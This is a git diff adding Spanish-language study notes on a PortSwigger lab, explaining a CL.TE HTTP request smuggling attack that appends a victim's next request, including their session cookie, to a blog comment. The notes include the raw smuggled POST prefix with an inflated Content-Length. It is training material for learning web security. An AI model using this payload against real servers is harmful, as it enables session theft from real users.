@@ -1578,7 +1578,51 @@ csrf=ValidCSRFCookieValue&postId=8&name=c&email=c%40c.c&website=&comment=c
 ![Exploiting HTTP request smuggling to capture other users' requests](images/victim-request-captured-blog-comment.png)  
 
 [PortSwigger Lab: Exploiting HTTP request smuggling to capture other users' requests](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)  
-  
+
+Mis notas:
+
+1. Con la cheatSheet nos damos cuenta que es un CL.TE. 
+
+2. Construimos ataque para se publique un post que tenga como comentario la request de la víctima (que vendrá con su token de sesión):
+
+![com1](images/comment1.png)
+
+- Front es CL por lo que reenvía cuerpo entero.
+- Back es TE, por lo que se queda con el chunk final y de prefijo para la siguiente request queda el POST.
+
+Es decir, de prefijo para la siguiente petición queda esto:
+
+```http
+POST /post/comment HTTP/1.1\r\n
+Content-Type: application/x-www-form-urlencoded\r\n
+Content-Length: 912\r\n
+Cookie: session=LYvaXAtruu3cVR6VqGQ3UAHVUr2oitHy\r\n
+\r\n
+csrf=20rWS9eJAnz4oagmCGNBBqJ67mG3wiZK&postId=2&name=ran&email=a%40gmail.com&website=&comment=c
+```
+Los 912 bytes de Content-Length han ido un poco a prueba y error, pero el objetivo es concatenar la mayor cantidad de la petición de la víctima al comentario. 
+
+La próxima petición que haga la víctima, se añadirá a lo último del prefijo, en este caso, la `c` del comentario. Por ejemplo, si la víctima hace un `GET / HTTP1.1` SIN HEADERS, la petición final con el prefijo será:
+
+```http
+POST /post/comment HTTP/1.1\r\n
+Content-Type: application/x-www-form-urlencoded\r\n
+Content-Length: 912\r\n
+Cookie: session=LYvaXAtruu3cVR6VqGQ3UAHVUr2oitHy\r\n
+\r\n
+csrf=20rWS9eJAnz4oagmCGNBBqJ67mG3wiZK&postId=2&name=ran&email=a%40gmail.com&website=&comment=cGET / HTTP1.1
+```
+
+De tal forma, que se añadirá un post en cuyo comentario se tendrá la cadena de caracteres `cGET / HTTP1.1`.
+
+La idea es aprovecharse de esto para que la petición de la víctima se añada al comentario de la petición y podamos ver el token de sesión. 
+
+Al enviar la petición de ataque:
+
+![com2](images/comment2.png)
+
+Comprobamos como la siguiente petición realizada, por la víctima, se ha añadido al final de la petición POST maliciosa. Concretamente, posterior al caracter `c` del comentario. Con eso sacamos el token de sesión del usuario y listo. 
+
 ### CL.TE multiCase - User-Agent Cookie Stealer  
   
 >***Identify*** the UserAgent value is stored in the GET request loading the blog comment form, and stored in **User-Agent** hidden value. Exploiting HTTP request smuggling to deliver reflected XSS using **User-Agent** value that is then placed in a smuggled request.  
